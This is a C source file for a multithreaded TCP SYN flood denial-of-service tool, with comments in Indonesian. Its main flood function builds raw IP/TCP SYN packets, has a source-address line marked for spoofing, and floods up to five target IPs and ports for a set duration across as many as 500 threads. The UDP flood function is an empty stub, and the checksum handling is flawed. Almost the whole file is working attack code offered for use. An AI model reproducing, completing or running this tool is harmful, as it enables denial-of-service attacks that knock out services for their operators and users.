#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <sys/uio.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <stdint.h>

#define PACKET_SIZE 65500
#define MAX_THREADS 500
#define MAX_MSG 10

typedef struct {
    char target_ips[5][16];
    int ports[5];
    int duration;
    int spoof_ip;
    int attack_type;
} AttackData;

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

unsigned short checksum(void *b, int len);
void *tcp_syn_flood(void *args);
void *udp_flood(void *args);

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *tcp_syn_flood(void *args) {
    AttackData thread_data = *(AttackData *)args;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Raw socket error");
        pthread_exit(NULL);
    }

    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in target;
    struct pseudo_header psh;

    target.sin_family = AF_INET;
    time_t end_time = time(NULL) + thread_data.duration;

    while (time(NULL) < end_time) {
        for (int i = 0; i < 5; i++) {
            if (strlen(thread_data.target_ips[i]) == 0)
                break;

            target.sin_addr.s_addr = inet_addr(thread_data.target_ips[i]);
            target.sin_port = htons(thread_data.ports[i]);

            memset(packet, 0, PACKET_SIZE);

            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            iph->id = htonl(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = inet_addr("192.168.1.100"); // Bisa diganti spoof IP
            iph->daddr = target.sin_addr.s_addr;
            iph->check = checksum((unsigned short *)packet, iph->tot_len);

            tcph->source = htons(rand() % 65535);
            tcph->dest = target.sin_port;
            tcph->seq = 0;
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->syn = 1;
            tcph->window = htons(65535);
            tcph->check = 0;
            tcph->urg_ptr = 0;

            psh.source_address = iph->saddr;
            psh.dest_address = iph->daddr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));

            memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), &psh, sizeof(struct pseudo_header));
            tcph->check = checksum((unsigned short *)(packet + sizeof(struct iphdr)), sizeof(struct tcphdr));

            sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Fungsi UDP Flood (dummy, tambahin sendiri kalau perlu)
void *udp_flood(void *args) {
    pthread_exit(NULL);
}

// Fungsi utama
int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Usage: %s <target_ip1,ip2,...> <port1,port2,...> <duration> <threads> <spoof_ip (1/0)> <attack_type (0=UDP, 1=TCP)>\n", argv[0]);
        return 1;
    }

    int threads = atoi(argv[4]);
    if (threads > MAX_THREADS) {
        printf("Max threads allowed: %d\n", MAX_THREADS);
        return 1;
    }

    AttackData data;
    memset(&data, 0, sizeof(data));
    data.duration = atoi(argv[3]);
    data.spoof_ip = atoi(argv[5]);
    data.attack_type = atoi(argv[6]);

    char *token;
    int idx = 0;
    token = strtok(argv[1], ",");
    while (token && idx < 5) {
        strncpy(data.target_ips[idx], token, 15);
        data.target_ips[idx][15] = '\0';
        token = strtok(NULL, ",");
        idx++;
    }

    idx = 0;
    token = strtok(argv[2], ",");
    while (token && idx < 5) {
        data.ports[idx] = atoi(token);
        token = strtok(NULL, ",");
        idx++;
    }

    srand(time(NULL));
    printf("Starting attack with %d threads...\n", threads);

    pthread_t thread_id[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_id[i], NULL, data.attack_type ? tcp_syn_flood : udp_flood, (void *)&data) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("Attack stopped.\n");
    return 0;
}